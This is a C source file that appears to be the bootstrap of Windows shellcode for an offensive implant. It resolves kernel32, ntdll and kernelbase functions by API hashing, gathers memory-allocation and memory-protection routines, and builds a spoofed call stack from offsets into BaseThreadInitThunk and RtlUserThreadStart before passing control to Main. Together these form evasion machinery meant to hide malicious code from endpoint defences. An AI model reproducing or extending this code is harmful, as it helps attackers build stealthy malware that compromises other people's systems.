#include <windows.h>

#include "Ntdll.h"
#include "Instance.h"
#include "Prototypes.h"
#include "PreHash.h"
#include "Macros.h"

D_SEC(B)
VOID PreMain(
    _In_ PVOID Param
    )
{
    INSTANCE Inst;

    Inst.Info.StartAddr     = GetShellcodeStart();
    Inst.Info.End           = GetShellcodeEnd();
    Inst.Info.dwSize        = U_PTR(Inst.Info.End) - U_PTR(Inst.Info.StartAddr);

    Inst.Module.Kernel32    = xGetModuleHandle(HASH_Kernel32);
    Inst.Module.Ntdll       = xGetModuleHandle(HASH_Ntdll);
    Inst.Module.Kernelbase  = xGetModuleHandle(HASH_Kernelbase);

    if (!Inst.Module.Kernel32 || !Inst.Module.Ntdll || !Inst.Module.Kernelbase)
    {
        return;
    }

    Inst.NtAllocateVirtualMemory    = xGetProcAddress(Inst.Module.Ntdll, HASH_NtAllocateVirtualMemory);
    Inst.NtProtectVirtualMemory     = xGetProcAddress(Inst.Module.Ntdll, HASH_NtProtectVirtualMemory);
    Inst.RtlRandomEx                = xGetProcAddress(Inst.Module.Ntdll, HASH_RtlRandomEx);

    Inst.LoadLibraryA               = xGetProcAddress(Inst.Module.Kernel32, HASH_LoadLibraryA);
    Inst.RtlLookupFunctionEntry     = xGetProcAddress(Inst.Module.Kernel32, HASH_RtlLookupFunctionEntry);
    Inst.GetProcAddress             = xGetProcAddress(Inst.Module.Kernel32, HASH_GetProcAddress);

    Inst.BaseThreadInitThunk        = U_PTR(xGetProcAddress(Inst.Module.Kernel32, HASH_BaseThreadInitThunk)) + 0x14;
    Inst.RtlUserThreadStart         = U_PTR(xGetProcAddress(Inst.Module.Ntdll, HASH_RtlUserThreadStart)) + 0x21;

    Inst.RtlCreateHeap              = xGetProcAddress(Inst.Module.Ntdll, HASH_RtlCreateHeap);
    Inst.RtlAllocateHeap            = xGetProcAddress(Inst.Module.Ntdll, HASH_RtlAllocateHeap);

    if(
        !Inst.NtAllocateVirtualMemory   ||
        !Inst.NtProtectVirtualMemory    ||
        !Inst.RtlRandomEx               ||
        !Inst.LoadLibraryA              ||
        !Inst.RtlLookupFunctionEntry    ||
        !Inst.GetProcAddress            ||
        !Inst.BaseThreadInitThunk       ||
        !Inst.RtlUserThreadStart        ||
        !Inst.RtlCreateHeap             ||
        !Inst.RtlAllocateHeap  
    )   
    {
        return;
    }
    
    Inst.stackFrame.frame1.pModuleAddr = Inst.Module.Kernel32;
    Inst.stackFrame.frame1.pFunctionAddr =  Inst.BaseThreadInitThunk;
    Inst.stackFrame.frame1.dwOffset = 0x14;

    Inst.stackFrame.frame2.pModuleAddr = Inst.Module.Ntdll;
    Inst.stackFrame.frame2.pFunctionAddr = Inst.RtlUserThreadStart;
    Inst.stackFrame.frame2.dwOffset = 0x21;

    Inst.stackFrame.pGadget = Inst.Module.Kernelbase;



    Main(Param, &Inst);
}